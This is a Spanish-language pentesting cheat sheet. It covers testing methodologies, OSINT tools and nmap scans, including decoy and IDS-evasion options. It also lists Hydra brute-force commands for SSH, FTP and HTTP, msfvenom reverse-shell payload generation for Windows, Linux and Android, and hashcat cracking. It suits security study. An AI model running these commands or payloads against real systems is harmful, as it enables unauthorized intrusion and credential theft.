# Metodologías de Pentesting

## PTES (Penetration Testing Execution Standard)
Un estándar diseñado para proporcionar un marco común en la ejecución de pruebas de penetración. Define metodologías y procedimientos detallados para realizar auditorías técnicas de seguridad tanto en empresas como en proveedores de servicios.

## OWASP (Open Web Application Security Project)
Organización sin ánimo de lucro dedicada a mejorar la seguridad de las aplicaciones web. Ofrece metodologías, guías y herramientas de seguridad, destacando el OWASP Top 10, un ranking de las vulnerabilidades más críticas en aplicaciones web.

## OSSTM (Open Source Security Testing Methodology Manual)
Manual que proporciona un marco de trabajo detallado para la ejecución de auditorías de seguridad. Describe las fases y técnicas a seguir en un pentesting completo.

## MITRE ATT&CK
Marco de referencia que documenta tácticas, técnicas y procedimientos utilizados por atacantes en escenarios reales. Se utiliza en equipos de Red Team y Blue Team para entender, mitigar y simular amenazas.

---

# RECONOCIMIENTO Y ENUMERACIÓN

## Hacking – Conceptos Técnicos Previos

- **Target**: Objetivo (sistema, máquina, empresa, web…) que será evaluado o atacado.
- **CTF (Capture The Flag)**: Competición de seguridad informática donde los participantes deben explotar vulnerabilidades en sistemas para obtener *flags* que demuestran el acceso.
- **Alcance**: Nivel de profundidad con el que se ejecuta una auditoría de seguridad.
- **VPN (Virtual Private Network)**: Red privada virtual que crea un túnel seguro entre dos puntos sobre internet.
- **Vulnerabilidad**: Punto débil en un sistema que puede ser explotado por un atacante.
- **Exploit**: Código diseñado para aprovechar una vulnerabilidad y permitir la ejecución de acciones en el sistema.
- **Payload**: Código que ejecuta una acción maliciosa tras la explotación de una vulnerabilidad.
- **0-Day**: Vulnerabilidad no conocida por el proveedor o sin un parche disponible, lo que permite a los atacantes explotarla sin restricciones.

## OSINT (Open Source Intelligence)
Técnicas y herramientas utilizadas para obtener información pública de un objetivo.

- **Google Dorks**: Uso de operadores avanzados de búsqueda en Google para encontrar información sensible.
- **[Shodan](https://www.shodan.io/)**: Motor de búsqueda de dispositivos conectados a internet.
- **[Robtex](https://www.robtex.com/)**: Herramienta de análisis de redes y dominios.
- **[DNSDumpster](https://dnsdumpster.com/)**: Servicio de recolección de información DNS y mapeo de infraestructura.
- **[Nslookup](https://www.nslookup.io/)**: Comando para realizar consultas DNS.
- **[Dig](https://toolbox.googleapps.com/apps/dig/)**: Herramienta avanzada para consultas DNS.
- **[Maltego](https://www.maltego.com/)**: Plataforma de análisis de relaciones y visualización de datos para OSINT.
- **[The Harvester](https://www.osintux.org/documentacion/the-harvester)**: Herramienta para recopilar correos electrónicos, subdominios e información de servidores mediante OSINT.
- **[Censys](https://search.censys.io/)**: Motor de búsqueda de activos en internet similar a Shodan.
- **[Wawf00]([url](https://github.com/EnableSecurity/wafw00f))**: Herramienta para la detección de firewalls de aplicaciones web (WAF).
- **[Sublist3r]([url](https://github.com/aboul3la/Sublist3r))**: Herramienta para enumerar subdominios de un dominio objetivo utilizando OSINT.
## Enumeración / Escaneo

- **Ping**: Comprobación de disponibilidad de un host en la red.
- **arp-scan**: Escaneo de direcciones MAC en la red.
- **Nmap**: Escaneo de red y detección de servicios.
- **Netdiscover**: Descubrimiento de dispositivos en una red local.
- **Smbclient**: Cliente SMB para interactuar con recursos compartidos en redes Windows.
- **Nbtscan**: Escaneo de redes para obtener información sobre NetBIOS.
- **Enum4Linux**: Herramienta para enumerar usuarios y recursos en sistemas Windows vía SMB.
- **AutoRecon**: Script de automatización de escaneos con Nmap y otras herramientas ([Repositorio en GitHub](https://github.com/Tib3rius/AutoRecon)).

## Nmap - Escaneo de Red
```bash
nmap -sS 192.168.1.1      # Escaneo SYN (rápido y sigiloso)
nmap -sT 192.168.1.1      # Escaneo TCP (conexión completa)
nmap -sU -p- 192.168.1.1 # Escaneo de puertos UDP
nmap -sV 192.168.1.1      # Detección de versiones de servicios
nmap -A 192.168.1.1       # Escaneo agresivo (OS, scripts, traceroute)
nmap --script=vuln 192.168.1.1  # Buscar vulnerabilidades
nmap -oN output.txt 192.168.1.1  # Formato normal
nmap -oX output.xml 192.168.1.1  # Formato XML
nmap -D RND:10 192.168.1.1  # Uso de decoys
nmap -sS --scan-delay 500ms 192.168.1.1  # Evitar detección IDS
nmap -p 80 --badsum 192.168.1.1  # Prueba de firewall
```

---

# EXPLOTACIÓN (HACKING SISTEMAS) Y CRACKING

## Ataques con Hydra (Fuerza Bruta)
```bash
hydra -l admin -P passwords.txt ssh://192.168.1.1  # SSH
hydra -l root -P passwords.txt ftp://192.168.1.1  # FTP
hydra -l admin -P passwords.txt 192.168.1.1 http-get /admin  # HTTP
```

## Payloads con Msfvenom
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<P> -f exe > shell.exe  # Windows
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<P> -f elf > shell.elf  # Linux
msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT=<P> -o shell.apk  # Android
```

## Ataques con Hashcat
```bash
hashcat -m 0 -a 0 hash.txt rockyou.txt  # Ataque de diccionario
hashcat -m 1000 -a 3 hash.txt ?a?a?a?a  # Ataque de máscara
hashcat -m 2500 -a 0 handshake.hccapx wordlist.txt  # WPA/WPA2
```

---

# EXPLOTACIÓN II (HACKING WEB)

## Web Enumeration
```bash
gobuster dir -u <url> -w /usr/share/wordlists/dirb/common.txt  # Buscar directorios
gobuster dns -d <dominio> -w /usr/share/wordlists/subdomains.txt  # Subdominios
python3 dirsearch.py -u <url> -e php,html,txt  # Dirsearch
wpscan --url <url> --enumerate vp  # Vulnerabilidades en WordPress
```

## Hacking con Curl
```bash
curl -I <url>  # Obtener encabezados HTTP
```

## SSLScan - Auditoría SSL/TLS
```bash
sslscan <dominio>  # Escaneo general
sslscan --no-failed --port 443 <dominio>  # Solo resultados exitosos
```

## Command Injection

## File Upload

##  XSS (Reflected & Stored & Cookie Hijacking)

## CSRF

## LFI

## RFI & RFI to Reverse Shell

## SQL Injection


---

# POST-EXPLOTACIÓN Y ANONIMATO

## Técnicas de Evasión
```bash
nmap -D RND:10 192.168.1.1  # Uso de decoys
```

## 📌 Recursos Adicionales
- [GitHub: Hacking With Curl](https://github.com/frizb/HackingWithCurl)
- [Artículo: Hacking with Curl](https://manasharsh.medium.com/hacking-with-curl-unleash-the-cli-beast-fdf13ec342cc)
- [Cheatsheet: Curl](https://www.stationx.net/curl-cheat-sheet/)
